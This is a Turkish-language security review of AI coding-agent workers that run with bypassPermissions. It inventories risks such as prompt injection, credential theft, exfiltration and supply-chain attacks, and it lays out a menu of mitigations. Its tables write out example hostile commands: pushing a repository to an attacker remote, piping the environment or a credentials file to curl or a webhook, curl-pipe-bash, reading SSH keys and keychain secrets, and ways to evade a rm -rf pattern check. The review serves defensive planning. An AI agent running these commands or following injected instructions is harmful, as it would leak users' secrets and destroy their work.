# H1 — bypassPermissions Worker Güvenlik Postürü: Envanter + Azaltım Menüsü

> **Tarih:** 24 Ağustos 2026 · **Kapsam:** Taskard worker postürünün risk envanteri, `risky_operations` yeterlilik analizi, azaltım seçenekleri menüsü · **Yöntem:** Yerel kaynak analizi (SKILL.md, agents/, templates/config.toml, R1 envanteri) + güncel harness dokümantasyonu · **Not:** Bu dosya karar önerisi DEĞİL, karar menüsüdür.

## Yönetici özeti

1. `bypassPermissions` worker'ın teknik yetki sınırı **makine çapındadır** (tüm HOME + network). Taskard'ın worktree/brief/kapsam disiplinleri bu sınırı *söz* olarak daraltır; OS seviyesinde hiçbir şey zorlamaz.
2. `risky_operations` pattern listesi 5 maddeyle **en bilinen 5 yıkıcı komutu** yakalar; credential okuma, veri exfiltration, kalıcılık kurma ve MCP üzerinden dış etki sınıfları listede **hiç yok**. Ayrıca string-eşleşme bypass'larına açıktır.
3. Enforcement mimarisindeki en kritik boşluk: `risky_operations`'ın **kim tarafından uygulandığı tanımsız** — implementer.md bunu modele devreder ("eşleşme görürse BLOCKED raporla"), yani tek savunma modelin kendi vicdanıdır. bypassPermissions altında teknik gate yoktur.
4. Harness tarafında umut verici gelişme: Claude Code'da `deny` kuralları ve ask kuralları **bypassPermissions altında bile** değerlendirilir (resmî SDK dokümanı); OpenCode'da `--auto` açıkça reddedilenleri korur. Yani "%99 otonom + %1 sert duvar" postürü mevcut araçlarla kurulabilir — Taskard'ın üç-kapı felsefesiyle uyumludur.
5. AvenoxAI üç katman formülünde Taskard **onay katmanı** ve **geri alınabilirlikte** güçlü, **dar patlama yarıçapında** (OS-level containment) zayıftır — bypassPermissions tam da o katmanı sıfırlayan tercihtir. Menüdeki en yüksek getirili ikili: sandbox + kritik dosya kilidi.

---

## 1. Saldırı yüzeyi envanteri

Önce tehdit modelinin çerçevesi: worker'ın kötü niyetli olduğu varsayılmaz. Gerçekçi vektörler üç gruptur:

- **V1 — Manipülasyon (prompt injection):** worker'ın okuduğu her içerik (issue metni, web içeriği, log/test çıktısı, dependency README'si, brief'e sızan metin) bypassPermissions altında emre dönüşebilir.
- **V2 — Yanlışlık:** model hatasıyla yanlış dizinde silme, yanlış branch'e force push, yanlış dosyaya reset.
- **V3 — Aracılı saldırı (supply chain):** worker'ın kurduğu bağımlılığın (npm/pip install) install script'i, veya yüklenen projenin `.mcp.json`'ının kendisi zararlıdır (R1'de Claude Code `-p` modunda proje `.mcp.json`/hook'larının güven diyaloğu olmadan yüklendiği zaten notlu).

### 1.1 Dosya sistemi

| Yetenek | Somut örnek | Not |
|---|---|---|
| HOME genelinde silme/taşıma | `rm -rf ~/projects`, `find ~ -name "*.ts" -delete`, `mv` | Pattern listesi yalnız `rm -rf` literal'ini görür |
| Dotfile yazma → kalıcılık | `~/.zshrc`, `~/.gitconfig` (alias hook), `~/.claude/settings.json` | Sonraki TÜM oturumları zehirler; Claude Code'da protected paths (.git, .claude, .gitconfig…) koruması bypassPermissions'ta **kaybolur** |
| Config/self-modification | Taskard'ın kendi SKILL.md, AGENTS.md, `.taskard/` dosyalarını değiştirme | Iron Law 1 yasaklar ama yaptırım model disiplinidir |
| Git hook'larına persistence | `.git/hooks/pre-commit` yazma | Bir kez yazılır, her commit'te çalışır |

### 1.2 Git

| Yetenek | Somut örnek | Not |
|---|---|---|
| History yeniden yazma | `git rebase`, `git filter-repo`, pushed commit'e `--amend` | SKILL.md "push edilen commit'e dokunulmaz" der; teknik engel yok |
| Çalışmanın kaybı | `git reset --hard`, `git clean -fdx`, `git checkout -- .`, `git branch -D` | Uncommitted iş için geri dönüş yok (reflog yardımcı olmaz) |
| Dışa push | Normal push, tag push, `gh release create`, `gh pr merge` | Listede yalnız `git push --force` var |
| Exfiltration kanalı | `git remote add exfil https://attacker.git/x && git push exfil main` | Repo içeriği (ve commit geçmişinde kalmış sırlar) dışarı çıkar; "push yasak" konvansiyonu yeni remote'u engellemez |

### 1.3 Credentials

| Hedef | Somut erişim | Not |
|---|---|---|
| SSH anahtarları | `cat ~/.ssh/id_*` | Sandbox yoksa okuma serbest |
| macOS Keychain | `security find-generic-password -s mem0-api-key -w` | EmirOS konvansiyonunda API anahtarları keychain'de — worker bunu bilen bir modele "anahtarları topla" dedirtirse çalışır |
| Env / .env dosyaları | `cat .env`, `printenv`, `env | curl -d @- ...` | Claude Code `Read(.env)` deny'si yalnız Read tool'unu bloklar; `cat .env` Bash'ten geçer. OpenCode `.env` read'i default deny + `--auto` altında da geçerli (en sağlam örnek). Codex `:workspace` profili `**/*.env = none` destekler |
| Token depoları | `~/.config/gh/hosts.yml`, `~/.aws/credentials`, auth.json dosyaları, tarayıcı cookie store | Hepsi düz dosya okuması |

### 1.4 Network (exfiltration + supply chain)

| Yetenek | Somut örnek | Not |
|---|---|---|
| Veri dışarı çıkarma | `curl -X POST https://webhook.site/x -d @credentials.txt`, `scp`, `nc`, DNS sorgusuyla encode | Brief/report dosyaları, env, git geçmişi taşıyabilir |
| Keydetsiz kod çalıştırma | `pip install <paket>`, `npm install` → install script'leri | V3'ün ana giriş kapısı; meşru geliştirme işinin de parçası olduğundan kör kısıtlama zor |
| İndirme + çalıştırma | `curl … | bash` | Hem kalıcılık hem tam compromise |

### 1.5 MCP araçları üzerinden dış etkiler

- bypassPermissions, MCP tool çağrılarını da otomatik geçirir; `risky_operations` Bash metnine baktığı için MCP çağrılarını **hiç görmez**.
- Somut etkiler: GitHub MCP ile PR/issue/release açma, Slack/Discord'a mesaj, DB MCP ile `DROP TABLE` (listede var ama MCP çağrısı olarak gelirse pattern yakamaz), browser automation ile gerçek hesaplarda işlem.
- R1'deki bulgu tekrar hatırlatılır: Claude Code headless'ta proje `.mcp.json` güven sorulmadan yüklenir → worker'ın araç envanteri, çalıştırdığı projenin kontrolündedir. Antigravity'de `--no-mcp` bile yok (#342).

---

## 2. Risk tablosu

Olasılık/Etki yarı-nicel (Düşük/Orta/Yüksek). "Mevcut koruma" yalnızca teknik olarak çalışan mekanizmaları sayar; model disiplini ayrıca işaretlenir.

| # | Risk sınıfı | Senaryo (vektör) | Olasılık | Etki | Mevcut koruma |
|---|---|---|---|---|---|
| R1 | Yıkıcı dosya işlemi | Yanlış dizinde `rm -rf` / `find -delete` (V2) | Orta | Yüksek | `risky_operations` (kısmi) + model disiplini |
| R2 | Uncommitted iş kaybı | `reset --hard`, `clean -fdx` (V1/V2) | Orta | Yüksek | Yok (reflog committed işe yardım eder) |
| R3 | Credential sızıntısı | `.env`/SSH/keychain okundu → network'ten çıktı (V1/V3) | Orta | **Kritik** | Yok. (OpenCode default `.env` deny'si tek istisna) |
| R4 | Veri exfiltration | Secrets webhook'a gönderildi (V1) | Orta | **Kritik** | Yok |
| R5 | Supply chain | Zararlı install script / proje `.mcp.json`'ı (V3) | Orta | Yüksek | Yok (sandbox network-off kapatır) |
| R6 | Git history/push hasarı | Force push, rebase, pushed-amend, yanlış repoya push (V1/V2) | Düşük-Orta | Yüksek | Konvansiyon ("push edilen commit'e dokunulmaz", "headless'a git write verilmez") — teknik gate yok |
| R7 | Kalıcılık / self-modification | Dotfile, git hook, CLAUDE.md/AGENTS.md, Taskard config enjeksiyonu (V1/V3) | Düşük | Yüksek (kalıcı, çapraz oturum) | Iron Law 1 + model disiplini |
| R8 | MCP üzerinden dış etki | GitHub/Slack/DB MCP çağrılarıyla gerçek dünya işlemi (V1/V3) | Düşük-Orta | Yüksek | Yok; pattern listesi MCP'yi hiç taramıyor |
| R9 | Maliyet/felaket tüketimi | Enjekte eden aktörün token/maliyet pompalaması, sonsuz döngü | Düşük | Orta | max_attempts=2, bütçe alanı (opsiyonel) |

En ağır bileşim: **R3+R4** (credential okuma → exfiltration) — gerçekleşmesi için tek bir enjekte edilmiş cümle yeter; tespiti ise sonradan neredeyse imkânsız (audit log yok).

---

## 3. `risky_operations` yeterlilik analizi

### 3.1 Yakaladığı sınıflar

Liste (`migration, deploy, rm -rf, drop table, git push --force`) **bariz, tek komutluk, yüksek sesle yıkıcı** işlemleri yakalar: veritabanı migration/deploy, kabaca silme, force push, SQL drop. Değeri: en sık V2 kazalarının (yanlışlıkla force push vb.) önüne model-düzeyinde bir fren olur.

### 3.2 Kaçırdığı sınıflar

| Kaçan sınıf | Örnekler |
|---|---|
| Eş anlamlı yıkıcı komutlar | `find -delete`, `trash`, `git clean -fdx`, `dd if=/dev/zero`, `mkfs` |
| Git'in diğer geri dönülemezleri | `git reset --hard`, `git rebase`, `git filter-repo`, `git branch -D`, pushed-commit amend, `gh pr merge`, `gh release create` |
| String-eşleşme bypass'ları | `rm  -rf` (çift boşluk), `rm -fr`, `cd /tmp && rm -rf x`, `sh -c "rm -rf ..."`, `echo y \| xargs rm -rf`, base64 decode pipe |
| Credentials sınıfı | `security find-generic-password`, `cat ~/.ssh/*`, `printenv`, `.env` okuma — listede **hiç** yok |
| Network/exfiltration sınıfı | `curl -X POST --data @dosya`, `wget`, `scp`, `nc`, `curl … \| sh` |
| Kalıcılık sınıfı | Dotfile/git-hook/CLAUDE.md yazımı, launchd/cron kurulumu |
| MCP araç çağrıları | Pattern listesi Bash metnine bakıyor; MCP tool çağrısı bu taramanın dışında |

### 3.3 Yapısal tespit

1. **Enforcement sahibi tanımsız.** Implementer.md: *"Riskli işlem (config.toml → risky_operations eşleşmesi) gerektiğinde yapma; BLOCKED raporla."* Bu, eşleştirmeyi worker modeline devreder. bypassPermissions altında başka hiçbir katman devrede değildir → tek savunma hattı modelin kendi dikkatidir.
2. **Teknik karşılığı bedavaya yakın.** Claude Code'da `settings.json → permissions.deny` kuralları bypassPermissions altında bile değerlendirilir (resmî SDK dokümanı; "deny rule matches → blocked, even in bypassPermissions"); OpenCode'da `--auto` açıkça `"deny"` işaretlenenleri korur. Yani `risky_operations` listesi bir config üreticisiyle harness deny kurallarına çevrilirse liste ilk kez gerçekten zorlayıcı olur. Bilinen pürüz: Claude Code'un native deny'sinde tarihî düşme bug'ları raporlandı (#6699, #11226) → kritik maddeler için ince PreToolUse hook yedeği önerilir.
3. **Deny-Read yanılsaması.** Claude Code'da `Read(./.env)` deny'si yalnızca Read tool'unu bloklar; `cat .env` geçer. Dosya-bazlı koruma ancak sandbox'ın OS-level `denyRead/denyWrite`'iyle anlamlılaşır.

---

## 4. Azaltım menüsü

Menü kümelenmiştir; tek seçilebilir gibi değildir, kombinasyon beklenir. Her satır: neyi kapatır · maliyet · trade-off.

### M1. Harness-native deny katmanı (config üretimi)
`templates/config.toml`'daki `risky_operations`'u genişletip dispatch anında harness'in deny sözdizimine çevirmek (Claude: `permissions.deny`; OpenCode: agent frontmatter `permission.bash` object; Codex: custom permission profile).
- **Kapatır:** R1, R2, R6'nın komut kısmı; OpenCode'da R3'ün `.env` kısmı.
- **Maliyet:** Düşük (tek seferlik converter + genişletilmiş liste). Performans etkisi yok.
- **Trade-off:** Pattern bypass'larına yine açıktır (string eşleşme); MCP'yi yine görmez; Claude native deny'de bilinen düşme bug'ları var. "Model disiplininden teknik zora" geçişin en ucuz adımı budur.

### M2. OS-level sandbox (postürün merkezine sandbox koymak)
Varsayılanı `bypassPermissions` değil, **sandbox + otomatik-edit** yapmak: Claude Code `sandbox.enabled` (+ `autoAllowBashIfSandboxed`), Codex `--sandbox workspace-write` (network default kapalı), OpenCode sandboxless ama deny kurallı, agy/Cursor `--sandbox`.
- **Kapatır:** R3, R4, R5'in büyük kısmı; HOME'a yazma; R7'nin dotfile ayağı. Patlama yarıçapını makineden proje dizinine indirir — üç katman formülündeki 1. katmanı onarır.
- **Maliyet:** Orta. Meşru network işleri (npm/pip install, API testi) exception ister. macOS'ta Codex'in `network_access = true` config'ini Seatbelt'in sessizce yoksayması bilinen pürüz (#10390) — network gerektiren adımlar için çıkış kapısı tanımlanmalı.
- **Trade-off:** bypassPermissions'ın sunduğu "asla takılmama" akıcılığı kısmen kaybolur; ama sandbox içindeki komutlar otomatik onaylanabildiği için pratikte %90+ akış prompt'suz kalır. Taskard'ın "insan onayı üç kapıda" ilkesiyle çelişmez — kapı sayısı artmaz, kapıların arkası daralır.

### M3. Kritik dosya kilidi (sandbox denyRead/denyWrite listesi)
Sandbox açık olsun olmasın, ayrıca sabit kilit listesi: `~/.ssh/**`, `*.env*`, keychain CLI çağrıları (`security *`), `~/.aws`, `auth.json`, harness config'lerinin kendisi, Taskard'ın `SKILL.md`+agents.
- **Kapatır:** R3 (okuma ayağı), R7 (self-modification ayağı). NVIDIA AI Workbench deseni: "agent'ın kendi kural dosyaları denyWrite'ta olmalı."
- **Maliyet:** Düşük. Liste statik, proje başına bakım istemez.
- **Trade-off:** Credential gerektiren meşru iş (deploy lane'i gibi) o lane'e özel istisna ister; istisna mekaniği tanımlanmadan açılırsa sürekli BLOCKED üretir.

### M4. Onay kuyruğu deseni (%99 otonom / %1 insan)
Worker risky işlemi yapmaz; `.taskard/tmp/approvals/<lane>.md`'e talebi yazar ve BLOCKED döner. Ana döngü kuyruğu topluca kullanıcıya sunar; onaylananlar ana akışta (kullanıcı gözü önünde) icra edilir.
- **Kapatır:** Hiçbir şeyi teknik olarak KAPATMAZ; R1–R8'in *insan görünürlüğünü* sağlar ve audit izi bırakır.
- **Maliyet:** Çok düşük — mevcut BLOCKED protokolünün formalizasyonu; SKILL.md'e bir paragraf.
- **Trade-off:** Uygulama model-disiplinine bağlı kalır (enjekte edilmiş worker kuyruğa yazmak yerine direkt yapmayı deneyebilir — M1/M2 olmadan garantisi yoktur). Gecikme maliyeti: onay bekleyen lane durur (graph modunda bağımsız lane'lerle maskelenir).

### M5. Otomatik checkpoint / backup hook
Lane açılışında snapshot (worktree zaten varsa `git stash create` + ref kaydı), lane kapanışında otomatik checkpoint commit; PostToolUse hook'la kritik klasörlerde periyodik `git add -A && git commit --no-verify` gölge dalına.
- **Kapatır:** R1/R2'nin *etkisini* (geri alınabilirlik); uncommitted iş kaybını reflog'a taşır.
- **Maliyet:** Düşük-orta (hook script + disk). 
- **Trade-off:** Sırları da checkpoint'leyebilir → gölge repo push edilmemeli; MCP/dış dünya etkilerini geri alamaz (geri alınabilirlik formülün 3. katmanını güçlendirir ama sınırları vardır).

### M6. Headless cross-harness sıkılaştırması
SKILL.md Ek A'daki "headless worker'a git write verilmez" cümlesini bayrak seviyesine indirmek: Claude headless `--permission-mode acceptEdits` + dar `--allowedTools` (+ `--disallowedTools "Bash(git push*)"`), Codex `--sandbox workspace-write` (default read-only zaten), OpenCode `--auto` + agent frontmatter deny'leri, Cursor `-p`'yi `--force`'sunuz bırak (analiz modu).
- **Kapatır:** En zayıf halka: dış harness'larda "bypass varsayımı". R6'nın headless ayağı, R3/R4'ün bir kısmı.
- **Maliyet:** Düşük — adapter başına bir bayrak seti; R1'deki dispatch tariflerine tek satır ek.
- **Trade-off:** Bazı meşru headless işleri (commit atmayan ama network isteyen) read-only'de tıkanabilir; lane tipine göre iki profil (analiz / build) tanımlanabilir.

### M7. Çalışma dizini sınırlandırma
Graph modunda zaten olan worktree disiplinini loop moduna ve `--add-dir`/`additionalDirectories` politikasına bağlamak: worker'a proje dizini + `.taskard/` dışı ek dizin verilmez; OpenCode `external_directory: ask`.
- **Kapatır:** Komşu projeye/HOME'a yanlışlıkla zararı (R1'in kapsamını daraltır).
- **Maliyet:** Düşük (Taskard worktree kültürüne eklemlenir).
- **Trade-off:** Cross-repo işler (monorepo dışı bağımlılık düzeltme) istisna ister.

### M8. MCP envanter disiplini
Lane brief'inde gereken MCP sunucuları sayılır; headless Claude çağrılarında `--strict-mcp-config` + minimal `--mcp-config`, gereksizse MCP'siz başlatma; `.mcp.json`'ı projeden değil merkezi yerden besleme.
- **Kapatır:** R5'in MCP ayağı, R8'in büyük kısmı.
- **Maliyet:** Orta (araç kullanım alışkanlığı değişir; agy'de `--no-mcp` olmadığı için tam kapatma imkânsız — #342).
- **Trade-off:** MCP'ye dayanan lane'ler (GitHub işlemleri) için beyaz liste bakımı gerekir.

### Önerilen kombinasyon mantığı (karar için pusula, karar değil)
- **Minimum hareket:** M1 + M4 (liste genişlet + deny'ye çevir + onay kuyruğu) — konvansiyon paketi kimliğine sadık, sıfır altyapı.
- **Postür değişikliği:** M2 + M3 (sandbox + kilit) — üç katman formülündeki eksik katmanı onarır; bypassPermissions'ın "bilinçli tercih" değerini korurken patlama yarıçapını proje dizinine indirir.
- **Tam set:** yukarıdakiler + M5 + M6 + M8 — graph modunda çoklu-harness üretim kullanımı için.

---

## 5. Üç katman formülü karşılaştırması

AvenoxAI doktrini: **(1) dar patlama yarıçapı + (2) onay katmanı + (3) geri alınabilirlik.**

| Katman | Taskard'daki durum | Güçlü/Zayıf | Kanıt |
|---|---|---|---|
| 1. Dar patlama yarıçapı | Söz düzeyinde dar (brief kapsamı, worktree, "while I'm here yasak"), teknik düzeyde **geniş** (HOME + network + MCP). Sandbox yok. | **Zayıf** | bypassPermissions + sandbox'sız Bash = yarıçap tüm makine (bkz. §1) |
| 2. Onay katmanı | Tasarımsal olarak **zengin**: plan onayı, merge öncesi doğrulama, risky_operations — üç kapı dokümante. Ama kapılar süreç kapısı; risky_operations'un teknik yaptırımı yok, bypass kapıları sessiz geçebilir. | **Güçlü (tasarım) / Orta (uygum)** | SKILL.md §Iron Law 5 + gates bölümü; §3.3'teki enforcement boşluğu |
| 3. Geri alınabilirlik | Git merkezli akış doğal checkpoint üretir: push-edilmemiş amend esnekliği, reflog, kanıt-rapor kültürü, fix protokolü. Delikler: uncommitted silmeler, push sonrası history, git-dışı etkiler (MCP, dış servis). | **Güçlü (git içi) / Zayıf (git dışı)** | SKILL.md fix protokolü; M5 bu deliği kapatır |

**Formül cümlesi:** Taskard, doktrinin 2. ve 3. katmanını konvansiyon seviyesinde taşıyor; bypassPreferences tercihi 1. katmanı bilinçli olarak sıfırlıyor. Menüdeki M2+M3, 1. katmanı konvansiyon yazmadan (kod/altyapı eklemeden, yalnızca dispatch bayraklarıyla) restore etmenin yolu — bu, "konvansiyon paketi kod içermez" ilkesiyle de uyumludur çünkü sandbox bir konfigürasyon bayrağıdır, ürün kodu değildir.

---

## 6. Karara hazır net sorular (Emir'e)

1. **İki katmanlı postür:** `bypassPermissions` native subagent'larda (senin makinen, interaktif oturumun) kalsın ama **headless cross-harness çağrılarda** `acceptEdits`/`workspace-write`'a insin mi? (M6 — en düşük maliyetli sıkılaştırma, tek dosyalık değişiklik.)
2. **Sandbox varsayılanı:** Dispatch'lere OS-sandbox eklenirse meşru akışın kırılacak komutları neler (npm/pip install, network'lü test, deploy dry-run)? İstisna mekanizması "lane brief'inde beyan + ana akış onayı" olsun mu? (M2'nin gerçek maliyetini bu cevap belirler.)
3. **Credential erişimi:** Worker'ların `~/.ssh`, keychain, `.env` okumasına hiçbir senaryoda ihtiyaç var mı? Yoksa M3 kilidi istisnasız uygulanabilir — bu tek karar R3+R4'ü (en kritik bileşim) fiilen kapatır.
4. **`risky_operations` karakteri:** Liste model-disiplini olarak mı kalsın, yoksa dispatch anında harness deny kurallarına otomatik çevrilsin mi? Çevrilecekse genişletilmiş liste (§3.2'deki kaçanlar) onaylıyor musun — özellikle `git reset --hard`, `git clean -fdx`, `security find-generic-password`, `curl -X POST` gibi maddeler günlük işine girer mi?
5. **Geri alınabilirlik sigortası:** Lane başı otomatik snapshot/checkpoint (M5) disk maliyetine değer mi? Gölge checkpoint repo'su lokal mi kalsın, push edilmemiş remote'a mı?

---

## Ek A — Kaynaklar

**Yerel:** skills/taskard/SKILL.md (Iron Laws, Ek A cross-harness tarifleri) · agents/implementer.md, reviewer.md, frontend-developer.md · templates/config.toml · .scratch/taskard/research/r1-headless-dispatch-envanteri.md

**Web (Ağustos 2026):**
- Claude Code: [Agent SDK Permissions](https://code.claude.com/docs/en/agent-sdk/permissions) (deny/ask kuralları bypassPermissions altında da değerlendirilir; "actions no mode auto-approves") · [Permission modes & critical paths](https://code.claude.com/docs/en/permission-modes) · [Sandboxing](https://code.claude.com/docs/en/sandboxing) · [Hooks](https://code.claude.com/docs/en/hooks-guide) · PreToolUse deny bug'ları: anthropics/claude-code [#37210](https://github.com/anthropics/claude-code/issues/37210), [#6699/#11226](https://github.com/moizxsec/claude-deny-guard) (native deny düşmeleri + hook workaround) · [Permissions rehberi (2026)](https://www.claudedirectory.org/blog/claude-code-permissions-guide) (protected paths, deny>ask>allow) · [NVIDIA container sandbox deseni](https://docs.nvidia.com/ai-workbench/user-guide/latest/quickstart/quickstart-claude-sandbox.html) (denyWrite ile kendi config'ini koruma)
- Codex: [Sandbox & approvals](https://developers.openai.com/codex/concepts/sandboxing) · İki eksen modeli ([danielvaughan](https://codex.danielvaughan.com/2026/04/08/codex-cli-security-model-approval-sandbox-two-axis)) · [Permission profiles](https://codex.danielvaughan.com/2026/05/08/codex-cli-permission-profiles-sandbox-modes-security-layers) (`:workspace` protected paths + `**/*.env = none`) · macOS Seatbelt network_config sessiz yok sayma: openai/codex [#10390](https://github.com/openai/codex/issues/10390) · approvals_reviewer sub-agent deseni ([Agent approvals & security](https://developers.openai.com/codex/agent-approvals-security))
- OpenCode: [Permissions](https://opencode.ai/docs/permissions) (`--auto` deny'leri korur; granular bash/edit rules; `.env` default deny; agent frontmatter permission) · Subagent izin geçişliliği: anomalyco/opencode [#20549](https://github.com/anomalyco/opencode/issues/20549) (parent restriction propagation, PR #23290 ile kapanış)
